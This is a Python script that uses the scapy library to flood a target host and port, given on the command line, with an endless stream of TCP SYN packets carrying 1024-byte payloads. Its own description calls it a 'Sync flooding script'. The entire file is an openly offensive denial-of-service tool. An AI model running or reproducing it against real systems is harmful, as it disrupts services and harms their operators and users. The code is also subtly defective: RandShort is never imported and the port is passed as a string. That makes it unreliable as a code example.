from scapy.all import IP, TCP, Raw, send
import argparse

def flood(target, port):
              
              ip = IP(dst=target)
              
              tcp = TCP(sport=RandShort(),dport=port,flags="S")
              
              raw = Raw(b"X"*1024)
              
              packet = ip/tcp/raw
              
              send(packet, loop=1, verbose=0)
              
                        
if __name__ == "__main__":
                   
              parser=argparse.ArgumentParser(description="Sync flooding script")
              parser.add_argument("targets", help="Ip address of the host to flood with packets")
              parser.add_argument("ports", default="80", help="Port via which to send packets, port recommended")
              
              
              arg = parser.parse_args()
              
              target, port = arg.targets, arg.ports
              
              flood(target, port)
              
